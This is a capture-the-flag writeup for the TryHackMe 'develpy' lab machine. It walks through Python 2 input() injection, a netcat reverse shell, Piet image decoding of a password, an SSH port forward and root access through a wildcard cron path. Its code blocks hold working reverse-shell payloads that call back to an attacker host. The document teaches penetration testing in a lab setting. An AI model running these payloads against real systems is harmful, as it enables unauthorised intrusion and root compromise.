# BSides Guatemala  develpy  TryHackMe Writeup

**Target:** `TARGET_IP` (10.129.137.214 at time of solve)
**OS:** Linux (Ubuntu 16.04)
**Difficulty:** Medium
**Tech stack:** OpenSSH 7.2p2, custom Python daemon fronted by `socat` on port 10000
**Exploit chain:** Python `input()` injection on a `socat`-hosted Py2 script ? reverse shell as `king` ? Piet (`npiet`) PNG steganography ? `c00ffe123!` ? SSH as `king` ? SSH local-port-forward to internal web ? upload `.py` into a wildcard-glob cron path ? root reverse shell

---

## Attack Chain Overview

```
nmap ? 22, 10000 (snet-sensor-mgmt?)
    ?
curl :10000 ? Python traceback (Py2 input() on attacker bytes)
    ?
echo "__import__('os').system('id')" | nc ? uid=king
    ?
nc reverse shell as king ? user.txt
    ?
ls home ? credentials.png  +  exploit.py / run.sh / root.sh / root /company
    ?
exfil credentials.png; strings/exiftool empty; image is npiet/Piet
    ?
npiet credentials.png ? c00ffe123!  (king's password)
    ?
ssh king@$TARGET   (stable foothold)
    ?
crontab: */1 root cd /root/company && bash run.sh ? python /root/company/media/*.py
    ?
netstat -tulpn ? internal web on :8080 (file uploader)
    ?
ssh -L 8080:localhost:8080 king@$TARGET  ? upload reverse-shell .py
    ?
cron tick ? /bin/sh -i as root ? root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access  Python `input()` Injection](#2-initial-access--python-input-injection)
3. [Post-Exploitation (`king`)](#3-post-exploitation-king)
4. [User Flag  Piet/npiet Steganography](#4-user-flag--pietnpiet-steganography)
5. [Privilege Escalation  Wildcard-Glob Cron + SSH Tunnel](#5-privilege-escalation--wildcard-glob-cron--ssh-tunnel)
6. [Root Flag](#6-root-flag)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: full port scan with high performance options.
# Why here: discover all open ports to identify the custom service on port 10000.
nmap -sS -Pn -n -p- --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,10000 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 |
| 10000/tcp | `snet-sensor-mgmt?`  nmap couldn't classify |

The unidentified service is the entry point. See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Initial Access  Python `input()` Injection

Full technique: [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).

Open `:10000` in a browser / `curl`:
```bash
# What it does: probe the unknown service on port 10000.
# Why here: trigger a response or error to identify the technology (Python 2 in this case).
curl http://$TARGET:10000/
# Private 0days
#  Please enther number of exploits to send??: Traceback (most recent call last):
#   File "./exploit.py", line 6, in <module>
#     num_exploits = int(input(' Please enther number of exploits to send??: '))
#   NameError: name 'GET' is not defined
```

Py `input()` evaluates its argument. Confirm + RCE:
```bash
# What it does: send a Python snippet to the service via netcat.
# Why here: exploit the Py2 input() function to execute an arbitrary system command.
echo "__import__('os').system('id')" | nc $TARGET 10000
# uid=1000(king) gid=1000(king) groups=1000(king),...
```

Reverse shell:
```bash
# What it does: start a local listener to catch the reverse shell.
# Why here: wait for the incoming connection from the target machine.
nc -lvnp 4444
# What it does: send a Python payload that executes a netcat reverse shell.
# Why here: establish a remote interactive session as the 'king' user.
echo "__import__('os').system('nc -e /bin/bash $LHOST 4444')" | nc $TARGET 10000
```

Stabilise:
```bash
# What it does: spawn a PTY shell using Python.
# Why here: upgrade the simple netcat shell to a more functional interactive terminal.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

Tools: [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md) (which is what's hosting the script  see `cat run.sh` in §5).

---

## 3. Post-Exploitation (`king`)

Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).

```bash
# What it does: list all files in the current home directory including hidden ones.
# Why here: check for available files, scripts, and potential loot like the image file.
ls -lha
# -rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
# -rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
# -rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
# -rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
# -rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
# What it does: read the content of the user flag.
# Why here: confirm initial access success and capture the first milestone.
cat user.txt
```

`credentials.png` is the lead.

---

## 4. User Flag  Piet/npiet Steganography

Full technique: [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md).

Exfil and triage:
```bash
# Target
# What it does: start a temporary web server on the target.
# Why here: facilitate the exfiltration of the credentials.png file to the attacker machine.
python3 -m http.server 8888
# Attacker
# What it does: download the image file from the target.
# Why here: perform offline steganography analysis on the local machine.
wget http://$TARGET:8888/credentials.png
# What it does: search for ASCII strings in the PNG file.
# Why here: check for low-hanging fruit like cleartext passwords or clues in the image data.
strings credentials.png    # empty
# What it does: read EXIF metadata from the image.
# Why here: check for hidden comments or metadata fields that might contain credentials.
exiftool credentials.png   # nothing useful
# What it does: verify the file type.
# Why here: confirm the file structure before attempting to decode it as a Piet program.
file credentials.png       # PNG, blocky grid of saturated colours ? Piet
```

Run:
```bash
# What it does: install the npiet interpreter.
# Why here: obtain the necessary tool to execute the identified Piet steganography.
sudo apt install npiet
./npiet credentials.png
# c00ffe123!
```

Use it:
```bash
# What it does: log in via SSH as king.
# Why here: establish a permanent and stable foothold using the recovered credentials.
ssh king@$TARGET
# password: c00ffe123!
```

Tools: [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/strings.md), [wget](../../tools/web/wget.md).

---

## 5. Privilege Escalation  Wildcard-Glob Cron + SSH Tunnel

Full technique: [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md).

```bash
# What it does: check allowed sudo commands for the current user.
# Why here: identify quick paths to privilege escalation via sudoers misconfigurations.
sudo -l                                  # nothing
# What it does: read the system crontab file.
# Why here: identify scheduled tasks that might be running with root privileges.
cat /etc/crontab
# *  *    * * *   king    cd /home/king/ && bash run.sh
# *  *    * * *   root    cd /home/king/ && bash root.sh
# *  *    * * *   root    cd /root/company && bash run.sh

cat /home/king/run.sh
# socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &

cat root.sh
# python /root/company/media/*.py        ? wildcard glob, attacker-controlled dir
```

Confirm cron tick rate:
```bash
# What it does: monitor the system logs for cron activity.
# Why here: verify the execution frequency of the identified scheduled tasks.
tail -f /var/log/syslog | grep -i cron
```

Find the internal web that drops files into `/root/company/media/`:
```bash
netstat -tulpn
# tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
```

Tunnel it:
```bash
# What it does: establish an SSH local port forward.
# Why here: expose the internal web service (127.0.0.1:8080) to the attacker's local machine.
ssh -L 8080:localhost:8080 king@$TARGET
# Browser ? http://localhost:8080  (web uploader)
```

Drop a Python reverse shell `.py` through the uploader (it lands under `/root/company/media/`):
```python
import socket,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$LHOST", 1337))
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
```

Listener + wait:
```bash
# What it does: start a listener for the root reverse shell.
# Why here: catch the connection triggered by the cron job executing the uploaded script.
nc -lvnp 1337
#  one minute later 
# whoami ? root
```

See [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) for the SSH forward, and [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md) for the wildcard variant.

---

## 6. Root Flag

```bash
# What it does: read the root flag.
# Why here: complete the machine and document the final goal.
cat /root/root.txt
```

---

## 7. Key Takeaways

- An unidentified service replying with a Python traceback is almost always Py2 `input()` or a direct interpretation primitive. `echo "1+1" | nc` is a free probe; if it computes, you have RCE.
- `socat ... EXEC:./script,pty,stderr` is a debug pattern  when you find it, the script behind it is your foothold. Always read `run.sh` after landing.
- Image files in user homes that don't yield to `strings` / `exiftool` / `steghide` and **look like Mondrian** are Piet. Run them through `npiet`.
- Wildcard globs in cron lines (`python /opt/.../*.py`, `tar cf - *`, `chown -R user *`) are attacker-controlled if you can write to the glob dir. The cron line itself doesn't need to be writable.
- Internal-only HTTP services (`netstat -tulpn` shows `127.0.0.1:8080`) are reachable via SSH local port forward once you have any user account.

---

## Related Notes
- [python-input-injection.md](../../exploits/web-rce/python-input-injection.md)  initial access
- [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md)  user-flag steganography
- [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md)  wildcard-glob privesc variant
- [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md)  internal web pivot
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)  playbook backbone
- [nmap](../../tools/recon/nmap.md), [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md), [wget](../../tools/web/wget.md)  recon & delivery
- [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/strings.md)  image triage


